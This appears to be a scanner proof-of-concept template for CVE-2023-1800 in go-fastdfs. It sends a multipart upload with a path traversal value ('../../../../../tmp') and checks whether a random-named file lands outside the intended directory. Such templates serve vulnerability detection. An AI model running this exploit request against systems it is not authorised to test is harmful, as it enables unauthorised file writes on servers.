name: yaml-poc-sjqzhang-go_fastdfs-logical-CVE-2023-1800
binding: 27122732-6f9c-487f-961c-5c5db7bd53fc
detail:
    author: jiapeng.han
    links:
        - https://github.com/yangyanglo/ForCVE/blob/main/2023-0x05.md
        - https://vuldb.com/?ctiid.224768
        - https://vuldb.com/?id.224768
    vulnerability:
        id: 39cb2145-079e-48c3-977f-11f989e52a06
        level: critical
    warning: File Upload
transport: http
set:
    r1: randomLowercase(20)
    r2: randomLowercase(20)
    rboundary: randomLowercase(8)
    host: request.url.host
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /group1/upload
            headers:
                Content-Type: multipart/form-data; boundary=----WebKitFormBoundary{{rboundary}}
            body: |-
                ------WebKitFormBoundary{{rboundary}}
                Content-Disposition: form-data; name="file"; filename="id"
                Content-Type: application/octet-stream

                {{r2}}
                ------WebKitFormBoundary{{rboundary}}
                Content-Disposition: form-data; name="scene"

                default
                ------WebKitFormBoundary{{rboundary}}
                Content-Disposition: form-data; name="filename"

                {{r1}}
                ------WebKitFormBoundary{{rboundary}}
                Content-Disposition: form-data; name="output"

                json2
                ------WebKitFormBoundary{{rboundary}}
                Content-Disposition: form-data; name="path"

                ../../../../../tmp
                ------WebKitFormBoundary{{rboundary}}
                Content-Disposition: form-data; name="code"

                ------WebKitFormBoundary{{rboundary}}
                Content-Disposition: form-data; name="auth_token"

                ------WebKitFormBoundary{{rboundary}}
                Content-Disposition: form-data; name="submit"

                upload
                ------WebKitFormBoundary{{rboundary}}--
        expression: |
            response.status == 200 && response.body.bstartsWith(bytes("{")) && response.body.bcontains(bytes(host)) && response.body.bcontains(bytes("tmp/" + r1))
expression: r0()
